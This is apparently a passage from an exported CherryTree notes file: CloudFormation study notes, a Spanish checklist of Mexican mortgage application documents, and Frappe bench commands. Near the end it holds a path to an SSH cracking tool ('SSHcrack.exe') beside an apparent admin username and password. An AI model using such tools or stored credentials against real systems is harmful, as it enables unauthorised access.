		Handle - ref to WaitConditionHandle
	Handle is a presigned URL enable to send signal
	for EC2 and ASG recomended CreationPolicy
	use cfn-signal
	make an HTTP put request
	
Dynamic references
	references external values in SSM or in secrets
	CF retrieves the value, and change set operation
	master password in AWS secrets
	ssm plaint text, ssm-secure
	secretsmanager
	up to 60 dynamics
	
Modules
	package resources and configuration, use across templates
	is used as best practices
	use code written by experts
	
Resource import
	import exisiting resources into existing and new stacks
	is not necesary delete and recreate
	is necesary that describe the entire stacl
	a unique identifier for each target resource
	each resource myst have a DeletePolicy
	used when create a new stack from existing resources, move resource between stacks
	
SAM
	serverless application model
	framework for deploy and develop
	generate complex cloudformation
	
CDK
	Define the infra using a programming
	is possible import migrate a CF template  into to CDK
	
Macreos
	perform custom processing on CF template
	for example AWS::Serverless
	is necesary:
		lambda function
		a resource tupe AWS::CloudFormation::Macro
	process:
		the entire template
		a snipper of a template
		not macros witj macros
		not support stacksets</rich_text>
    </node>
  </node>
  <node name="notes" unique_id="156" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685390640" ts_lastsave="1689612800">
    <rich_text>
*	Identificación oficial vigente (INE, en caso de pasaporte nos lo validan pero nos piden otra identificación adicional, como cedula, licencia… )
*	Comprobante de domicilio, no mayor a dos meses 
*	Acta de Nacimiento
*	Acta de matrimonio (En caso de aplicar; si el régimen es bienes mancomunados necesitaríamos INE y Acta de Nacimiento del conyugue)
*	CURP 
*	Constancia de situación fiscal del mes en curso (Para asalariados es opcional, pero si podemos conseguirla mucho mejor)


• Últimos 3 meses de estados de cuenta donde depositen la nómina.  (Si escogemos Banamex como opción de banco, nos pedirán 6 meses)
• Últimos 3 meses de recibos de Nómina. (Si escogemos como banco Banamex, ellos nos piden 6 meses de recibos de nòmina)
• Comprobante de estabilidad laboral: Si los recibos de nómina tienen su fecha de ingreso, con eso ya se está validando este requisito, en caso de que   no tengan ese dato, una carta laboral validando tu antigüedad en el trabajo.


**En caso de que el cliente tramite su crédito como Cofinavit, se le pide lo siguiente:
*	Precalificación a la fecha de Cofinavit (con datos del cliente: RFC, numero de seguridad social y nombre completo)
*Pantallas de cuenta Infonavit (Pantalla de sin crédito Vigente y cuanto ahorro Tengo)
*Tabla de amortización de crédito modalidad Cofinavit

bin/SSHcrack.exe
admin
1212


bench update --reset
bench --site zecore-dev.localhost migrate</rich_text>
  </node>
</cherrytree>
